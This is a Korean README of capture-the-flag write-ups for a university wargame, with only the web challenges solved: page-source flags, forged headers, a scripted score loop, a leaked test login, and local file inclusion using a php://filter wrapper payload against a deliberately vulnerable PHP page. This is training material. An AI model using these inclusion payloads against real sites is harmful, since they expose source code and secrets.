# 공주대학교 정보보호영재교육원 Wargame

![](img/rank.png)

~~올클잼 :grin:~~

공주대 여러분들 중 라업쓰실거 있으시면 PR 하시면 머지해드립니다

`18_`로 시작하는 문제들은 작년(2017년)에 출제된 문제이니 준비하실거라면 푸는것도 추천드립니다!

## Table of Contents

* Web
  * [Basic (50pt)](#basic-50pt)
  * [Connect (150pt)](#connect-150pt)
  * [Find (300pt)](#find-300pt)
  * [Web1_Project3 (200pt)](#web1_project3-200pt)
  * [Web2_Project3 (200pt)](#web2_project3-200pt)
  * [Web3_Project3 (200pt)](#web3_project3-200pt)
  * [Web4_Project3 (200pt)](#web4_project3-200pt)
  * [Web5_Project3 (200pt)](#web5_project3-200pt)
  * [18_web1 (50pt)](#18_web1-50pt)
  * [18_web2 (100pt)](#18_web2-100pt)
  * [18_web3 (100pt)](#18_web3-100pt)
  * [18_web4 (100pt)](#18_web4-100pt)
  * [18_web5 (200pt)](#18_web5-200pt)

* Forensic
  * [ForensicPower (150pt)](#forensicpower-150pt)
  * [Decompress (300pt)](#decompress-300pt)
  * [Trust (500pt)](#trust-500pt)
  * [forensic1_Project3 (200pt)](#forensic1_project3-200pt)
  * [forensic2_Project3 (200pt)](#forensic2_project3-200pt)
  * [forensic3_Project3 (200pt)](#forensic3_project3-200pt)
  * [USB_Project3 (200pt)](#usb_project3-200pt)
  * [18_forensic1 (150pt)](#18_forensic1-150pt)
  * [18_forensic2 (100pt)](#18_forensic2-100pt)
  * [18_forensic3 (100pt)](#18_forensic3-100pt)
  * [18_forensic4 (150pt)](#18_forensic4-150pt)

* Crypto
  * [Crypto2 (300pt)](#crypto2-300pt)
  * [Crypto1_Project3 (200pt)](#crypto1_project3-200pt)
  * [Crypto2_Project3 (200pt)](#crypto2_project3-200pt)
  * [Crypto3_Project3 (200pt)](#crypto3_project3-200pt)
  * [18_crypto1 (50pt)](#18_crypto1-50pt)
  * [18_crypto2 (100pt)](#18_crypto2-100pt)
  * [18_crypto3 (100pt)](#18_crypto3-100pt)
  * [18_crypto4 (100pt)](#18_crypto4-100pt)

* Pwnable
  * [Pwnable1 (100pt)](#pwnable1-100pt)
  * [Pwnable2 (200pt)](#pwnable2-200pt)

* Network
  * [Login (200pt)](#login-200pt)
  * [network1_Project3 (200pt)](#network1_project3-200pt)
  * [network2_Project3 (200pt)](#network2_project3-200pt)
  * [network3_Project3 (200pt)](#network3_project3-200pt)
  * [network4_Project3 (200pt)](#network4_project3-200pt)
  * [network5_Project3 (200pt)](#network5_project3-200pt)
  * [18_network1 (50pt)](#18_network1-50pt)
  * [18_network2 (100pt)](#18_network2-100pt)
  * [18_network3 (150pt)](#18_network3-150pt)
  * [18_network4 (200pt)](#18_network4-200pt)

* Reversing
  * [Reversing1 (100pt)](#reversing1-100pt)
  * [Reversing2 (150pt)](#reversing2-150pt)
  * [number (200pt)](#number-200pt)
  * [endecoded (150pt)](#endecoded-150pt)
  * [rrrr (300pt)](#rrrr-300pt)
  * [reversing1_Project3 (200pt)](#reversing1_project3-200pt)
  * [reversing2_Project3 (200pt)](#reversing2_project3-200pt)
  * [reversing3_Project3 (200pt)](#reversing3_project3-200pt)
  * [reversing4_Project3 (200pt)](#reversing4_project3-200pt)
  * [reversing5_Project3 (200pt)](#reversing5_project3-200pt)
  * [reversing6_Project3 (200pt)](#reversing6_project3-200pt)
  * [18_reversing1 (150pt)](#18_reversing1-150pt)
  * [18_reversing2 (100pt)](#18_reversing2-100pt)
  * [18_reversing3 (100pt)](#18_reversing3-100pt)
  * [18_reversing4 (200pt)](#18_reversing4-200pt)

* Misc
  * [Forest (10pt)](#forest-10pt)
  * [See (10pt)](#see-10pt)

## Web

### Basic (50pt)

```
Find the flag this page
Flag Structure : flag is {real flag}
```

이 페이지에 플래그가 숨겨져 있다고 한다.

Ctrl+U로 소스보기를 이용해서 플래그를 알아내면 된다.

```html
<!-- 중략 -->
<div class="row">
    <div class="col-lg-12 text-center">
        Find the flag this page</br>
        Flag Structure : flag is {real flag}
        <!--flag is {W3b_is_S1mp1e}-->
        </form>
    </div>
</div>
<!-- 중략 -->
```

```
FLAG: W3b_is_S1mp1e
```

### Connect (150pt)

```
Referer : wantconnection
User-Agent : iwant!!!!
Go!
```

저기에 있는 조건대로 헤더를 만들어서 보내면 될것같다.

cURL로 풀면 쉬울것 같긴한데 잘 모르니까 python requests로 푼다.

```python
import requests
headers = {
  'user-agent': 'iwant!!!!',
  'referer': 'wantconnection'
}
req = requests.get('http://wargame_sec.kongju.ac.kr/web/connect/connect.php', headers=headers)
print(req.text)
```

```html
<!-- 중략 -->
<div class="row">
    <div class="col-lg-12 text-center">
        Key is Us3r_Ag3nt_@nd_R3f3r3r
    </div>
</div>
<!-- 중략 -->
```

```
FLAG: Us3r_Ag3nt_@nd_R3f3r3r
```

### Find (300pt)

```
1000점을 만들면 Flag가 나온다!
1000을 만들어 주세요!
Prob
```

소스를 보니까 hidden input이 있다.

![](img/find.png)

딱 보니 base64인것 같다.
Submit 버튼이 없으니 일단 F12를 누르고 Console탭에 들어간 후 다음을 실행시키자.

```javascript
document.querySelector('form').submit();
```

포인트가 1이 추가 되었다. 그러면 이걸 계속 반복하면 될것 같지만, 아쉽게도 Console에서는 불가능하니 python으로 해결하자.

PHP 세션ID도 필요 할것 같으니 쿠키에 넣고 돌려주자

```python
import requests
from base64 import b64encode

for i in range(1001):
    req = requests.post('http://wargame_sec.kongju.ac.kr/web/find/prob.php', data={'HaHa': b64encode(str(i).encode())}, cookies={'PHPSESSID': 'jcrcp6kp5ksl2shh1g6b2esei3'})

    if i != 1000:
      print(req.text[0:150])
    else:
      print(req.text)
```

```
Flag is W1nn3r_C0ngr4tur4t1on</br>Prize - Point 1000 : Flag</br>Your Point : 1000<form method='POST' action='prob.php'><input type='hidden' name='HaHa
Prize - Point 1000 : Flag</br>Your Point : 1001<form method='POST' action='prob.php'>
```

```
FLAG: W1nn3r_C0ngr4tur4t1on
```

### Web1_Project3 (200pt)

![](img/Web1_Project3.png)


#### 소스코드
```html
<body>
    <div class="login_box">
        <div class="box_title">
            <span>관리자로그인</span>
        </div>
        <div class="login_form">
            <form method="post">
                <input name="id" type="text" class="login_id" placeholder="ID"/><br />
                    <input name="pw" type="password" class="login_pw" placeholder="PW"/><br />
                    <input type="submit" value="로그인">
            </form>
        </div>
        <div class="status">
                    </div>
    </div>
</body>
<!--
Test Account : admin/admin123
    -->
```

뭔가 굉장히 로그인 하고 싶어진다.

ID를 `admin`으로 하고 비밀번호를 `admin123`으로 해주면 됩니당!

![](img/Web1_Project3-2.png)


```
FLAG: Unc0mpleted_Devel0pment
```

### Web2_Project3 (200pt)

처음 URL에 접속하면 다음과 같이 뜬다.

```
Plz POST me T.T
```

그러면 POST로 해보자.


```
Python 3.7.0 (v3.7.0:1bf9cc5093, Jun 27 2018, 04:06:47) [MSC v.1914 32 bit (Intel)] on win32
Type "help", "copyright", "credits" or "license" for more information.
>>> import requests
>>> response = requests.post('http://wargame_sec.kongju.ac.kr/web/web2_DJU/index.php')
>>> response.text
'<!DOCTYPE html>\n<html>\n\t<head>\n\t\t<title>web02</title>\n\t</head>\n\t<body>\n\t\tKEY is : p0s7_m3_1f_y0u_can\t</body>\n</html>\n'
>>>
```

```
FLAG: p0s7_m3_1f_y0u_can
```

### Web3_Project3 (200pt)

페이지에 들어가면 다음과 같이 뜬다.

```
이 페이지에서 이미 키를 드렸습니다.
```

뭐지 하고 개발자 도구에서 Network 탭에 들어가니 Response Header에 플래그가 담겨져 있었다.

![](img/Web3_Project3.png)

```
FLAG: thisisKey
```

### Web4_Project3 (200pt)

![](img/Web4_Project3.png)

페이지를 돌아다녀 보면 URL의 쿼리 스트링중 game이 바뀌는 것을 알수 있다.

```
http://wargame_sec.kongju.ac.kr/web/web4_DJU/index.php?game=lol
```

`http://wargame_sec.kongju.ac.kr/web/web4_DJU/lol.php`의 URL로 접속하면 공통된 부분을 제외한 부분만이 담겨져 있는것을 알 수 있다.

저 game 파라미터에 flag을 넣어보았다.

![](img/Web4_Project3-2.png)

```
FLAG: L0cal_F1l3_1nclus10n!!
```

### Web5_Project3 (200pt)

![](img/Web5_Project3.png)

PHP Wrapper을 사용하면 LFI를 할 수 있다. base64로 해도 되고 rot13으로도 해도 되는데 그냥 base64가 편해서 base64로 했다.

보아하니 따로 플래그 파일이 있는것이 아니고 저 `index.php` 파일 안에 플래그가 있어 보이니까 index.php를 base64 encode 했다.

```
php://filter/convert.base64-encode/resource=index.php
```

![](img/Web5_Project3-2.png)

이걸 base64 decode 하면 다음과 같은 소스 코드가 나온다!

```php
<?php
	// Key is : LFI_WITH_BASE64_IS_VERY_DANGEROUS_!
?>
<html>
	<head>
		<title>web05</title>
		<style>
			html, body{
				width: 100%;
				margin: 0;
				padding: 0;
				text-align: center;
			}
			body{
				margin-top: 40px;
			}
			.output{
				width: 800px;
				height: 120px !important;
				border: 1px solid #aaa;
				margin: 0 auto 20px auto;
				overflow-y: scroll;
			}
			.source{
				width: 504px;
				margin: 20px auto;
			}
		</style>
	</head>
	<body>
		<h1>LFI (Local File Inclusion)</h1>
		<form method="get">
		<input type="text" name="url"/>
		<input type="submit" value="ViewFile">
		</form>
		<div class="output">
			<?php
				if(isset($_GET["url"]) && !empty($_GET["url"])){
					$escape_pattern = array("etc","passwd", "ini", "%", "/");
					if(in_array($_GET["url"], $escape_pattern)){
						echo "No Hack~!";
						exit;
					}
					if(!file_exists($_GET["url"])){
						echo "No File Exists!\n";
					}
					include $_GET["url"];
				}else if(isset($_GET["url"]) && empty($_GET["url"])){
					echo "Empty!";
				}
			?>
		</div>
		<hr>
		<div class="source">
			index.php SOURCE<br />
			<?php
				include "./source.html";
			?>
		</div>
	</body>
</html>
```

```
FLAG: LFI_WITH_BASE64_IS_VERY_DANGEROUS_!
```

### 18_web1 (50pt)
### 18_web2 (100pt)
### 18_web3 (100pt)
### 18_web4 (100pt)
### 18_web5 (200pt)

## Forensic
### ForensicPower (150pt)
### Decompress (300pt)
### Trust (500pt)
### forensic1_Project3 (200pt)
### forensic2_Project3 (200pt)
### forensic3_Project3 (200pt)
### USB_Project3 (200pt)
### 18_forensic1 (150pt)
### 18_forensic2 (100pt)
### 18_forensic3 (100pt)
### 18_forensic4 (150pt)

## Crypto
### Crypto2 (300pt)
### Crypto1_Project3 (200pt)
### Crypto2_Project3 (200pt)
### Crypto3_Project3 (200pt)
### 18_crypto1 (50pt)
### 18_crypto2 (100pt)
### 18_crypto3 (100pt)
### 18_crypto4 (100pt)

## Pwnable
### Pwnable1 (100pt)
### Pwnable2 (200pt)

## Network
### Login (200pt)
### network1_Project3 (200pt)
### network2_Project3 (200pt)
### network3_Project3 (200pt)
### network4_Project3 (200pt)
### network5_Project3 (200pt)
### 18_network1 (50pt)
### 18_network2 (100pt)
### 18_network3 (150pt)
### 18_network4 (200pt)

## Reversing
### Reversing1 (100pt)
### Reversing2 (150pt)
### number (200pt)
### endecoded (150pt)
### rrrr (300pt)
### reversing1_Project3 (200pt)
### reversing2_Project3 (200pt)
### reversing3_Project3 (200pt)
### reversing4_Project3 (200pt)
### reversing5_Project3 (200pt)
### reversing6_Project3 (200pt)
### 18_reversing1 (150pt)
### 18_reversing2 (100pt)
### 18_reversing3 (100pt)
### 18_reversing4 (200pt)

## Misc
### Forest (10pt)
### See (10pt)
